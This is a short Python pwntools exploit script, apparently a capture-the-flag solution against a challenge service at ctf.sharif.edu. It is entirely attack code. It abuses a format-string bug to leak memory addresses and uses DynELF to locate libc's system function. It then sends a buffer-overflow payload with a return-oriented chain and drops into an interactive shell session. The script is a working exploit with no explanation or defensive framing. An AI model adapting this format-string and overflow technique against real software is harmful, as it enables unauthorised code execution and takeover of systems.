from pwn import *

r = remote('ctf.sharif.edu', 54514)

def leak(target):
	global r
	if '\n' in p64(target):
		return
	while True:
		try:
			print hex(target)
			r.sendline('%10$s++'.ljust(16, "\x00") + p64(target) + 'a' * (0x818 - 24) + p64(0x40078b))
			data = r.recvuntil('++', drop=True) + '\x00'
			break
		except:
			r = remote('ctf.sharif.edu', 54514)
	print `data`
	return data

d = DynELF(leak, 0x400000)
system = d.lookup('system', 'libc')
print hex(system)
r.sendline('a'*0x818 + p64(0x4008e3) + p64(0x4003cf) + p64(0x4005f0))
r.interactive()
